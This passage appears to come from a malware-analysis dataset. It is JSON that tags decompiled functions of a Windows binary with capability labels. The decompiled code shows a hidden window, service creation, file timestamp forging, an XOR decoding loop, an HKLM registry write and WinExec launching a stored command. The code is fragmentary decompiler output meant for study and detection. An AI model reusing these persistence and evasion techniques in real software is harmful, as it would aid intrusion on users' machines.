        "decompiled_code": "\nuint __cdecl fcn.00402b40(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4109bc, 0x41fa0c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 141
    },
    "00401000": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 16384 named .text\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 155
    },
    "00402090": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004020fd) overlaps instruction at (ram,0x004020fa)\n// \n\nuint fcn.00402090(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uchar *puVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    bool bVar12;\n    char cStack564;\n    uint uStack563;\n    uchar uStack304;\n    uint uStack303;\n    uchar auStack44 [36];\n    uint uStack8;\n    \n    puVar6 = &stack0xfffffffc;\n    uStack8 = param_2;\n    cStack564 = '\\0';\n    puVar7 = &uStack563;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    bVar12 = false;\n    uStack304 = '\\0';\n    puVar7 = &uStack304 + 1;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    if ((!bVar12) && (bVar12)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar4 = 0xffffffff;\n    pcVar9 = &cStack564;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    puVar7 = pcVar8 + -uVar4;\n    puVar11 = &uStack304;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar4 = uVar4 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar4 = 0xffffffff;\n    pcVar9 = 0x4104e8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar4 = ~uVar4;\n    iVar3 = -1;\n    pcVar9 = &uStack304;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar4;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar4 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    uVar4 = uVar4 & 3;\n    bVar12 = uVar4 == 0;\n    for (; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    if ((bVar12) || (!bVar12)) {\n        (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack304, 0, auStack44);\n    }\n    else {\n        puVar6 = &stack0xfffffffd;\n        (**0x6a)();\n        *(extraout_ECX + -1) = *(extraout_ECX + -1) + extraout_DL;\n    }\n    iVar3 = *(puVar6 + 0xc);\n    if (iVar3 == -1) {\n        iVar2 = fcn.00402350(*(puVar6 + 8));\n        if (iVar2 == -1) {\n            return 0;\n        }\n    }\n    else {\n        iVar2 = *(puVar6 + -4);\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, puVar6 + -0x24, puVar6 + -0x1c, puVar6 + -0x14);\n    if (iVar3 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1351
    },
    "00402760": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027a8) overlaps instruction at (ram,0x004027a7)\n// \n\nuint * __fastcall\nfcn.00402760(uint32_t param_1, uint8_t *param_2, uint param_3, uint param_4, uint *param_5, uint *param_6)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint8_t uVar5;\n    uint32_t unaff_EBX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint unaff_EBP;\n    uint *puVar9;\n    uint *puVar10;\n    uint unaff_ESI;\n    int32_t iVar11;\n    uint unaff_EDI;\n    uint *puVar12;\n    bool bVar13;\n    uint unaff_retaddr;\n    uint auStack24 [2];\n    \n    puVar9 = &stack0xfffffffc;\n    iVar11 = 0;\n    uVar6 = unaff_EBX;\n    puVar12 = param_5;\n    if (0 < param_6) {\n        do {\n            uVar5 = param_1 >> 8;\n            bVar13 = (uVar5 & param_6) == 6;\n            uVar7 = uVar6 & 0xffffff00 | *(iVar11 + puVar12);\n            if ((bVar13) || (!bVar13)) {\n                param_2 = iVar11 % puVar9[3];\n                iVar3 = puVar9[2];\n                uVar7 = uVar6 & 0xffffff00 | *(iVar11 + puVar12) ^ param_2[iVar3];\n            }\n            else {\n                uVar1 = in(param_2);\n                *puVar12 = uVar1;\n                if (&stack0xfffffff0 < 1) {\n                    pcVar4 = param_6 & 0xffffff18;\n                    *pcVar4 = *pcVar4 + pcVar4;\n                    auStack24[1] = 0x40281e;\n                    iVar11 = fcn.00402610(unaff_EDI, unaff_ESI, unaff_EBX, unaff_EBP, unaff_retaddr, param_3);\n                    if ((iVar11 == 0) || (0x5 < param_5)) {\n                        param_5 = 0xffffffff;\n                    }\n                    return param_5;\n                }\n                *(uVar7 + 0x7df799c6) = *(uVar7 + 0x7df799c6) ^ param_1;\n                puVar9 = puVar9 + 1;\n                *param_2 = *param_2 | param_2 >> 8;\n                iVar3 = 0;\n                puVar12 = puVar12 + 1;\n            }\n            bVar13 = ((uVar5 ^ iVar3 >> 8) + 1 & 0x27) != 0;\n            param_2 = (param_2 >> 8 & 0xffff00) << 8 | param_2 & 0xffff;\n            puVar10 = puVar9;\n            if ((bVar13) && (!bVar13)) {\n                puVar8 = auStack24 + 1;\n                puVar10 = auStack24 + 1;\n                cVar2 = '\\x10';\n                do {\n                    puVar9 = puVar9 + -1;\n                    puVar8 = puVar8 + -1;\n                    *puVar8 = *puVar9;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n            }\n            param_6 = puVar10[5];\n            uVar5 = param_6 ^ uVar7;\n            param_1 = param_1 & 0xffffff00 | uVar5;\n            *(iVar11 + puVar12) = uVar5;\n            iVar11 = iVar11 + 1;\n            uVar6 = uVar7;\n            puVar9 = puVar10;\n        } while (iVar11 < param_6);\n    }\n    return param_6;\n}\n",
        "token_count": 913
    },
    "004039b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403a0c) overlaps instruction at (ram,0x00403a0a)\n// \n// WARNING: Removing unreachable block (ram,0x00403ae0)\n// WARNING: Removing unreachable block (ram,0x004039f7)\n// WARNING: Removing unreachable block (ram,0x004039fd)\n// WARNING: Removing unreachable block (ram,0x004039fe)\n// WARNING: Removing unreachable block (ram,0x00403a06)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004039b0(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    char extraout_DL;\n    uchar *puVar2;\n    uint uVar3;\n    uint *puVar4;\n    bool bVar5;\n    uchar uStack536;\n    uint uStack535;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack16;\n    int32_t iStack12;\n    uint uStack8;\n    \n    uStack536 = 0;\n    puVar4 = &uStack535;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    puVar4 = &uStack275;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    uStack16 = 1;\n    *(puVar4 + 2) = 0;\n    uStack276 = uStack536;\n    // WARNING: Bad instruction - Truncating control flow here\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack276, str.eZ7Iy, &uStack536, param_1);\n    fcn.00401070(&uStack8, &iStack12);\n    iVar1 = fcn.00401d10(param_1, param_2, param_3, param_4, uStack8, iStack12);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    bVar5 = (extraout_DL + '\\x15') - (iVar1 >> 8) < '\\0';\n    *0x41fa14 = fcn.00402bb0();\n    puVar2 = &stack0xfffffffc;\n    if ((!bVar5) && (puVar2 = &stack0xfffffffc,  bVar5)) {\n        iStack12 = *0x41fa14 + -0x7407ba75;\n        uStack8 = extraout_ECX;\n        puVar2 = &uStack8 + 3;\n    }\n    iVar1 = fcn.00401f20(puVar2 + -0x110, uStack8, iStack12);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.004026c0();\n    iVar1 = fcn.004015e0(0x410508);\n    if (iVar1 == -1) {\n        iVar1 = fcn.004015e0(0x4104fc);\n        if (iVar1 == -1) goto code_r0x00403b89;\n        uVar3 = 0xf;\n    }\n    else {\n        uVar3 = 0xe;\n    }\n    iVar1 = fcn.00402390(*(puVar2 + 8));\n    if (iVar1 != 0) {\n        fcn.00401720(uVar3);\n        fcn.00402600(uVar3);\n        return 1;\n    }\n    if (*0x41fa14 == 0) {\n        return 0;\n    }\ncode_r0x00403b89:\n    iVar1 = fcn.00402a20(*(puVar2 + 8), puVar2 + -0x110);\n    if (iVar1 == 0) {\n        *(puVar2 + -0xc) = 0;\n    }\n    if ((*(puVar2 + -0xc) != 0) && (iVar1 = fcn.00402030(*(puVar2 + 8)),  iVar1 == 0)) {\n        *(puVar2 + -0xc) = 0;\n    }\n    if (*(puVar2 + -0xc) == 0) {\n        uVar3 = fcn.004023c0(*(puVar2 + 8), 0);\n        *(puVar2 + -0xc) = uVar3;\n    }\n    if (*(puVar2 + -0xc) != 0) {\n        fcn.00402600(0xffffffff);\n    }\n    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x41051c, 0);\n    return *(puVar2 + -0xc);\n}\n",
        "token_count": 1176
    },
    "00401720": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00401720(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4106a4, 0x4106e8, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}